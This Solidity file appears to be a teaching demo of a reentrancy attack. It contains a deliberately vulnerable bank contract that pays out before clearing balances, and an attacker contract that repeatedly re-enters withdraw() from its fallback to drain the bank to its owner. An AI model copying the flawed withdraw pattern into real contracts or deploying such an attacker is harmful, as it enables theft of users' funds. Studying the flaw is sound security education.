// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract VulnerableBank {
    mapping(address => uint256) balance;

    function deposit() public payable {
        uint256 current = balance[msg.sender];
        balance[msg.sender] = current + msg.value;
    }

    // ❌ 有漏洞
    function withdraw() public {
        require(balance[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(sent);
        balance[msg.sender] = 0;
    }

    // 获取合约总余额
    function getBankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    // 目标合约
    VulnerableBank public bank;

    // 攻击者自己的地址
    address public owner;

    // 接收以太币的回退函数
    receive() external payable {
        // 如果银行合约还有足够的以太币，就再次提取
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
        // 否则，将资金转移给攻击者
        else {
            payable(owner).transfer(address(this).balance);
        }
    }

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // 开始攻击
    function attack() external payable {
        // 1. 先存款，成为合法用户
        bank.deposit{value: 1 ether}();

        // 2. 立即提取，触发重入
        bank.withdraw();
    }

    mapping(address => uint256) balance;

    function deposit() public payable {
        uint256 current = balance[msg.sender];
        balance[msg.sender] = current + msg.value;
        // payable(msg.sender).transfer(msg.value);
    }

    // 获取合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}